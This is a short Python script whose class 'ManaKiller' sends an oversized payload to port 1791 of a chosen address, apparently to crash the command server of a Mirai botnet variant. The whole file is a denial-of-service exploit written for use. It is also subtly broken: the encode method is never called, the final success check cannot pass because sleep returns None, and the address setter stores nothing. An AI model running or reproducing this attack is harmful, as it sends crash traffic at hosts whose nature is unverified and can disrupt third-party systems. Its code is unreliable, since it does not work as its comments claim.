from socket import socket
from time   import sleep


class ManaKiller:
    def __init__(self, addr: str = '0.0.0.0') -> None:
        self._addr: str = addr
        
    ############################################################
    """Property functions."""
    @property
    def addr(self) -> str:
        return self._addr
    

    @addr.setter
    def addr(self, addr: str) -> None:        
        if not isinstance(addr, str):
            raise TypeError
            
    ############################################################
    """Static methods."""
    
    @staticmethod
    def verify_mana(arch: str) -> bool | None:
        """
        Detect whether arch is a common 
        Mana V4 source arch.
        
        Args:
            arch(str): arch of the Mirai CNC (malware variant)
            
        Return: 
            bool: Whether mana arch is found.
        """
        if tuple(mana_arch for mana_arch in ('lmaowtf','loligang') if mana_arch in arch.lower()):
            return True
            
    ############################################################
    """Main methods."""
    
    def exploit(self, attack: bool = False) -> bool:
        """OOB Mirai exploit.

        Args:
            attack(bool): Whether to send payload or not.
        
        Return: 
            bool | None
        """
        with socket() as sock:
            sock.settimeout(5)
            
            try:
                # NOTE: CNC server running?
                sock.connect((self.addr,1791))
            except:
                return False
                
            if attack:
                # NOTE: Send payload.
                sock.send('lmaoWTF'.join('ManaKiller'*999999).encode)
                
            return True

    
    def execute(self) -> bool | None:
        """Execute OOB exploit.
        
        Return: 
            bool, None
        """
        # NOTE: Verify whether the CNC is running on port 1791.
        if self.exploit():
            # NOTE: Execute exploit.
            if self.exploit(attack = True) and sleep(2) and not self.exploit():
                return True
                
            return False
